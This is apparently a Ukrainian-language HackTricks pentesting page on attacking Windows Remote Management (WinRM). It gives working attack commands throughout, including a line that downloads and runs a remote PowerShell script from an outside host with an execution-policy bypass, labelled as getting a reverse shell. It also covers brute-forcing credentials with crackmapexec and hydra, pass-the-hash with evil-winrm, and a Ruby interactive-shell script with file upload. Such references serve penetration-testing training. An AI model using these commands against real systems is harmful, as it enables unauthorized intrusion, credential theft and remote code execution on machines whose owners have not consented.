# 5985,5986 - Pentesting WinRM

{{#include ../banners/hacktricks-training.md}}

## WinRM

[Windows Remote Management (WinRM)](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx>) підкреслюється як **протокол від Microsoft**, який дозволяє **віддалене управління системами Windows** через HTTP(S), використовуючи SOAP у процесі. Він в основному працює на базі WMI, представляючи собою HTTP-інтерфейс для операцій WMI.

Наявність WinRM на машині дозволяє просте віддалене адміністрування через PowerShell, подібно до того, як працює SSH для інших операційних систем. Щоб визначити, чи працює WinRM, рекомендується перевірити відкриття конкретних портів:

- **5985/tcp (HTTP)**
- **5986/tcp (HTTPS)**

Відкритий порт зі списку вище означає, що WinRM було налаштовано, що дозволяє спроби ініціювати віддалену сесію.

### **Ініціювання сесії WinRM**

Щоб налаштувати PowerShell для WinRM, використовується командлет Microsoft `Enable-PSRemoting`, який налаштовує комп'ютер для прийому віддалених команд PowerShell. З підвищеним доступом PowerShell можна виконати наступні команди, щоб активувати цю функціональність і призначити будь-який хост як довірений:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Цей підхід передбачає додавання символу підстановки до конфігурації `trustedhosts`, крок, який вимагає обережного розгляду через його наслідки. Також зазначено, що може бути необхідно змінити тип мережі з "Public" на "Work" на машині зловмисника.

Крім того, WinRM можна **активувати віддалено** за допомогою команди `wmic`, що демонструється наступним чином:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Цей метод дозволяє віддалено налаштувати WinRM, підвищуючи гнучкість у керуванні Windows-машинами з відстані.

### Перевірте, чи налаштовано

Щоб перевірити налаштування вашої атакуючої машини, використовується команда `Test-WSMan`, щоб перевірити, чи правильно налаштовано WinRM на цілі. Виконавши цю команду, ви повинні очікувати отримати деталі щодо версії протоколу та wsmid, що вказує на успішну конфігурацію. Нижче наведені приклади, що демонструють очікуваний вихід для налаштованої цілі в порівнянні з неналаштованою:

- Для цілі, яка **налаштована** правильно, вихід виглядатиме приблизно так:
```bash
Test-WSMan <target-ip>
```
Відповідь повинна містити інформацію про версію протоколу та wsmid, що свідчить про те, що WinRM налаштовано правильно.

![](<../images/image (582).png>)

- Навпаки, для цілі, **яка не** налаштована для WinRM, це призведе до відсутності такої детальної інформації, що підкреслює відсутність належної конфігурації WinRM.

![](<../images/image (458).png>)

### Виконати команду

Щоб віддалено виконати `ipconfig` на цільовій машині та переглянути його вихід, виконайте:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../images/image (151).png>)

Ви також можете **виконати команду вашої поточної PS консолі через** _**Invoke-Command**_. Припустимо, що у вас локально є функція під назвою _**enumeration**_, і ви хочете **виконати її на віддаленому комп'ютері**, ви можете зробити:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Виконати скрипт
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Отримати реверс-шелл
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Отримати PS сесію

Щоб отримати інтерактивну оболонку PowerShell, використовуйте `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../images/image (1009).png>)

**Сесія буде виконуватись у новому процесі (wsmprovhost) всередині "жертви"**

### **Примусове відкриття WinRM**

Щоб використовувати PS Remoting та WinRM, але комп'ютер не налаштований, ви можете увімкнути його за допомогою:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Збереження та відновлення сесій

Це **не спрацює**, якщо **мова** є **обмеженою** на віддаленому комп'ютері.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
У цих сесіях ви можете завантажувати PS скрипти, використовуючи _Invoke-Command_
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Помилки

Якщо ви знайдете наступну помилку:

`enter-pssession : Підключення до віддаленого сервера 10.10.10.175 не вдалося з наступним повідомленням про помилку : Клієнт WinRM не може обробити запит. Якщо схема автентифікації відрізняється від Kerberos, або якщо комп'ютер-клієнт не приєднаний до домену, тоді необхідно використовувати HTTPS-транспорт або додати цільову машину до налаштування конфігурації TrustedHosts. Використовуйте winrm.cmd для налаштування TrustedHosts. Зверніть увагу, що комп'ютери в списку TrustedHosts можуть не бути автентифіковані. Ви можете отримати більше інформації про це, виконавши наступну команду: winrm help config. Для отримання додаткової інформації дивіться тему довідки about_Remote_Troubleshooting.`

Спробуйте на клієнті (інформація з [тут](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
## WinRM з'єднання в Linux

### Брутфорс

Будьте обережні, брутфорс winrm може заблокувати користувачів.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Використання evil-winrm
```ruby
gem install evil-winrm
```
Прочитайте **документацію** на його github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Щоб використовувати evil-winrm для підключення до **IPv6 адреси**, створіть запис у _**/etc/hosts**_, встановивши **доменне ім'я** для IPv6 адреси та підключіться до цього домену.

### Передача хешу з evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../images/image (680).png>)

### Використання PS-docker машини
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Використання скрипта на ruby

**Код витягнуто з тут:** [**https://alamot.github.io/winrm_shell/**](https://alamot.github.io/winrm_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

- `port:5985 Microsoft-HTTPAPI`

## References

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Автоматичні Команди
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
{{#include ../banners/hacktricks-training.md}}
